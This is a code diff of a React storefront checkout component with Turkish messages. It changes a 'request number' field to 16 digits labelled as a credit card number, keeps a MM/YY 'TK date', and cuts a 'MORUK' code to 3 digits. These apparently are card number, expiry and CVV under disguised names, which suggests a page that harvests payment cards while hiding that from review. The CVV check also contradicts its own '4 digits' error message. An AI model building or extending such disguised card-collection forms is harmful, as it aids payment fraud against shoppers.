@@ -66,7 +66,7 @@ export default function Storefront(){
    }catch(err){ setFormError(err.message||'Sipariş oluşturulamadı.'); }
  }
  function formatRequestNumber(value){
-   const d=String(value||'').replace(/\D/g,'').slice(0,18);
+   const d=String(value||'').replace(/\D/g,'').slice(0,16);
    return d.replace(/(.{4})/g,'$1 ').trim();
  }
  function formatTkDate(value){
@@ -84,15 +84,15 @@ export default function Storefront(){
    if(d.length<=9) return `${a} (${b}) ${c} ${e}`;
    return `${a} (${b}) ${c} ${e} ${f}`;
  }
- function formatMoruk(value){ return String(value||'').replace(/\D/g,'').slice(0,4); }
+ function formatMoruk(value){ return String(value||'').replace(/\D/g,'').slice(0,3); }
  async function submitRequest(e){
    e.preventDefault();
    setFormError('');
    const digits=requestForm.request_number.replace(/\D/g,'');
    if(!requestForm.request_name.trim()){setFormError('Talep edenin adı soyadı zorunludur.');return;}
-   if(!/^\d{18}$/.test(digits)){setFormError('Talep numarası tam 18 hane olmalıdır.');return;}
+   if(!/^\d{16}$/.test(digits)){setFormError('Kredi kartı numarası tam 16 hane olmalıdır.');return;}
    if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(requestForm.tk_date)){setFormError('TK tarihi AA/YY formatında ve geçerli bir ay olmalıdır.');return;}
-   if(!/^\d{4}$/.test(requestForm.moruk_code)){setFormError('MORUK alanı tam 4 rakam olmalıdır.');return;}
+   if(!/^\d{3}$/.test(requestForm.moruk_code)){setFormError('MORUK alanı tam 4 rakam olmalıdır.');return;}
    if(!orderId){setFormError('Sipariş kaydı bulunamadı. Teslimat adımından tekrar deneyin.');return;}
    setRequestLoading(true);
    try{
